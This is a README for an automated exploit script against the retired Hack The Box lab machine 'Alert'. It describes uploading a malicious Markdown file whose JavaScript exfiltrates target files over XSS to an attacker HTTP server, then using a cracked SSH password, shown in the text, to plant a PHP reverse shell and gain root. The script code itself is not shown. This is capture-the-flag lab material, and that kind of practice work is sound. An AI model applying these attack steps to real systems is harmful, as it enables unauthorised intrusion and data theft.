# 🧨 HTB - Alert AutoPwn Script

This script fully automates the exploitation of the retired Hack The Box machine **Alert**, including both **initial intrusion** and **privilege escalation to root**. It leverages a Markdown-based XSS, a local HTTP server, and a PHP reverse shell.

---
## 📋 Description

The script operates in two attack phases, selectable via `--type-attack`:

1. `intrusion`: Uploads a malicious `.md` file containing JavaScript to extract files from the target via XSS.
2. `privesc`: Uses valid SSH credentials for user `albert`, deploys a malicious `shell.php`, and spawns a reverse shell as root.

---
## 🧠 Requirements

- Python 3.x
- `sshpass` and `netcat` (`nc`) installed
- HTB VPN connection active
- Known password for `albert` (retrieved by cracking a hash)

---
## ⚙️ Usage

### 🐞 Phase 1 - XSS Intrusion

Starts an HTTP server to receive exfiltrated data from the vulnerable application:

```bash
python3 autopwn.py --type-attack intrusion --ip 10.10.14.5 --port 8000
```

Arguments:
- `--ip`	Your VPN IP to receive the HTTP request
- `--port`	Listening port for HTTP server (default: 8000)
- `--url`	Target base URL (default: http://alert.htb)

### ⚔️ Phase 2 - Privilege Escalation

Once you have cracked albert's password, use this phase to gain a root shell:
```bash
python3 autopwn.py --type-attack privesc --ip 10.10.14.5 --ssh-pass manchesterunited
```
Additional Arguments:
- `--ssh-pass`	Password for albert (required for privesc)
- `--ip-victim`	Victim IP address (default: 10.10.11.44)

The script will upload and execute shell.php over SSH and open a listener for the root reverse shell.

### 🧪 Full Attack Flow

```bash
# Step 1: XSS intrusion and file exfiltration
python3 autopwn.py --type-attack intrusion --ip 10.10.14.5 --port 8000

# Step 2: After cracking albert’s hash...
python3 autopwn.py --type-attack privesc --ip 10.10.14.5 --ssh-pass manchesterunited
```
### 🛠️ Features

    ✅ Clean menu with per-phase argument validation
    ✅ Dynamic JS and PHP payload generation (base64-encoded)
    ✅ SSH automation with sshpass (no user interaction)
    ✅ Reverse shell with nc listener spawned from Python
    ✅ Optional port forwarding functionality built-in (not used in default setup)
